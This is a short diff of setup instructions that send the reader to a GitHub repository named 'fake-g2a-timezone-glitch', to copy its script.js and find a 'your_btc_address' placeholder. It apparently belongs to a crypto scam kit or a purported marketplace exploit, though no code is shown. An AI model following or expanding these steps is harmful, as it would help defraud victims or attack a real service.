@@ -4,7 +4,7 @@ Go to https://github.com/g2aexploit/fake-g2a-timezone-glitch/blob/main/script.js
 
 Copy the script, save it in your notepad or just download it
 
-use CTRL+F in the script.js 
+use CTRL+F 
 
 Search for "your_btc_address"
 
